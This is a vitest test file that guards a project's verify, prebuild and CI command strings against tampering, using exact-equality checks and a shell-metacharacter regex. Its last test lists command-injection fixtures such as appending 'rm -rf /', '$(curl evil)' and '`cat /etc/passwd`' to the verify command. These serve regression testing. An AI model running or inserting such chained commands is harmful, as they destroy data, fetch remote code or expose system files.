import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { load } from 'js-yaml';

const ROOT = resolve(__dirname, '../..');

const PACKAGE_JSON = resolve(ROOT, 'package.json');
const WORKFLOW = resolve(ROOT, '.github/workflows/verify.yml');

/**
 * Every invocation path (the verify script, the prebuild hook, the CI step)
 * MUST be a short thunk calling scripts/verify-against-source.ts with no logic
 * of its own. Why: any per-invocation logic (conditional skips, multi-step
 * setup embedded in the thunk, alternative entrypoints) forks the verify
 * behavior between local and CI, which is exactly the drift the verifier
 * exists to prevent.
 *
 * This test file mixes exact-string equality (for short deterministic thunks)
 * with a tight forbidden-token regex (for documentation strings that vary).
 * Prior regex `/&&|\|\||;|>\s|<\s/` let through `&`, single `|`, `$(...)`,
 * backticks, unspaced redirects — all of which are sufficient to smuggle
 * arbitrary code into an invocation string.
 */

/**
 * Forbids shell metacharacters that could chain, pipe, redirect, substitute,
 * or background a command. Allowed: whitespace, `-`, `/`, `.`, `_`,
 * alphanumerics, unquoted arg tokens.
 */
const SHELL_METACHAR = /[&|;<>`$()]/;

const EXPECTED_VERIFY_SCRIPT = 'tsx scripts/verify-against-source.ts';
const EXPECTED_PREBUILD_SCRIPT = 'pnpm verify';
const EXPECTED_CI_VERIFY_RUN = 'pnpm verify --since HEAD~1';
const EXPECTED_CI_STEP_ORDER: Array<{ kind: 'uses' | 'run'; match: string | RegExp }> = [
  { kind: 'uses', match: 'actions/checkout@v4' },
  { kind: 'run', match: /apt-get install -y poppler-utils/ },
  { kind: 'uses', match: 'pnpm/action-setup@v4' },
  { kind: 'uses', match: 'actions/setup-node@v4' },
  { kind: 'run', match: 'pnpm install --frozen-lockfile' },
  { kind: 'run', match: 'pnpm vitest run' },
  { kind: 'run', match: 'pnpm astro check' },
  { kind: 'run', match: 'pnpm knip:files' },
  { kind: 'run', match: EXPECTED_CI_VERIFY_RUN },
];

describe('verify-against-source invocation purity', () => {
  it('package.json scripts.verify equals the exact expected thunk', () => {
    const pkg = JSON.parse(readFileSync(PACKAGE_JSON, 'utf-8'));
    expect(pkg.scripts?.verify).toBe(EXPECTED_VERIFY_SCRIPT);
  });

  it('package.json scripts.prebuild equals the exact expected thunk', () => {
    const pkg = JSON.parse(readFileSync(PACKAGE_JSON, 'utf-8'));
    expect(pkg.scripts?.prebuild).toBe(EXPECTED_PREBUILD_SCRIPT);
  });

  it('CI verify step equals the exact expected command (no evasion via $, `, &, |)', () => {
    const wf = load(readFileSync(WORKFLOW, 'utf-8')) as {
      jobs: { verify: { steps: Array<{ name?: string; run?: string; uses?: string }> } };
    };
    const steps = wf.jobs?.verify?.steps ?? [];
    const verifyStep = steps.find(
      (s) => typeof s.run === 'string' && /pnpm verify/.test(s.run),
    );
    expect(verifyStep, 'no step in verify.yml invokes pnpm verify').toBeDefined();
    expect(verifyStep!.run!.trim()).toBe(EXPECTED_CI_VERIFY_RUN);
  });

  it('CI workflow verify job has the exact expected step sequence (M3 whitelist)', () => {
    const wf = load(readFileSync(WORKFLOW, 'utf-8')) as {
      jobs: { verify: { steps: Array<{ run?: string; uses?: string }> } };
    };
    const steps = wf.jobs?.verify?.steps ?? [];
    expect(
      steps.length,
      `verify job step count drifted; expected ${EXPECTED_CI_STEP_ORDER.length}, got ${steps.length}`,
    ).toBe(EXPECTED_CI_STEP_ORDER.length);
    EXPECTED_CI_STEP_ORDER.forEach((expected, i) => {
      const step = steps[i];
      if (expected.kind === 'uses') {
        expect(step.uses, `step ${i} uses`).toBe(expected.match);
      } else {
        const run = (step.run ?? '').trim();
        if (expected.match instanceof RegExp) {
          expect(run, `step ${i} run`).toMatch(expected.match);
        } else {
          expect(run, `step ${i} run`).toBe(expected.match);
        }
      }
    });
  });

  it('M2 regression: known evasions would fail the exact-equality guard', () => {
    // Each of these would have passed the prior /&&|\|\||;|>\s|<\s/ regex but
    // be rejected by toBe(EXPECTED_*). Self-documenting evasion fixtures so a
    // future relaxer sees what the tightening prevents.
    const evasions = [
      'tsx scripts/verify-against-source.ts & rm -rf /',
      'tsx scripts/verify-against-source.ts >/tmp/leak',
      'tsx scripts/verify-against-source.ts $(curl evil)',
      'tsx scripts/verify-against-source.ts | tee /tmp/log',
      'tsx scripts/verify-against-source.ts `cat /etc/passwd`',
    ];
    for (const e of evasions) {
      expect(e).not.toBe(EXPECTED_VERIFY_SCRIPT);
      expect(e).toMatch(SHELL_METACHAR);
    }
  });
});
